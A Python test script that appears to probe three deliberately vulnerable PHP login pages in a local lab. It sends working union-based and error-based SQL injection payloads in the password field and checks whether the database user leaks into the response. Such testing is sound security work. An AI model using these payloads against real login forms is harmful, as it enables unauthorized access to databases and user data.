import requests

print("------------------------------------")


def test_correct_functionality(base_url, file_names):
    
    data = {
        'user': "admin",
        'pass': "password"
    }
    for file_name in file_names:
        url = f"{base_url}/{file_name}"
        response = requests.post(url, data=data)
        #print (response.text)    

        try:
            assert response.status_code == 200 and data['user'] in response.text 
            print(f"Functionality worked for {file_name}!")
        except AssertionError:
            try:
                assert "Wrong username or password" in response.text
                print(f"Functionality is working for {file_name} but nothing found")
            except AssertionError:
                print(f"Assertion error: Additional condition not met")
    print("------------------------------------")  



########## Union Based Injection Testing #############
def test_union_based_injection(base_url, file_names):
   
    payload = "'union select user(),null,null, null from users -- -"

    data = {
        'user': 'admin',
        'pass': payload
    }
    for file_name in file_names:
        url = f"{base_url}/{file_name}"
        response = requests.post(url, data=data)
       # print (response.text)    

        try:
            assert 'root@localhost' in response.text
            print (f"Union-based SQL injection test passed for {file_name}")
        except AssertionError:
           print(f'Union-based SQL injection test failed for {file_name}')
    print("------------------------------------")  


########## Error Based Injection Testing #############

def test_error_based_injection(base_url, file_names):
    
    payload="'AND ExtractValue(0,CONCAT(0x5c,USER())) -- -"
    payload2='"AND ExtractValue(0,CONCAT(0x5c,USER())) -- -'

    data = {
        'user': "admin",
        'pass': payload
    }
    data2 = {
        'user': "admin",
        'pass': payload2,
    }
    for file_name in file_names:
        url = f"{base_url}/{file_name}"
        response = requests.post(url, data=data)
        response2 = requests.post(url, data=data2)
        #print(response.text)

        try:
            assert 'root@localhost' in response.text or 'root@localhost' in response2.text
            print (f"Error-based SQL injection test passed for {file_name}") 
        except AssertionError:
            print(f'Error-based SQL injection test failed for {file_name}')

    print("------------------------------------")


payload = "'union select user(),null,null, null from users -- -"
base_url = "http://localhost:4000/sqli"
file_names = ["login.php", "login2.php", "login3.php"]


test_correct_functionality(base_url, file_names)
test_union_based_injection(base_url, file_names)
test_error_based_injection(base_url, file_names)
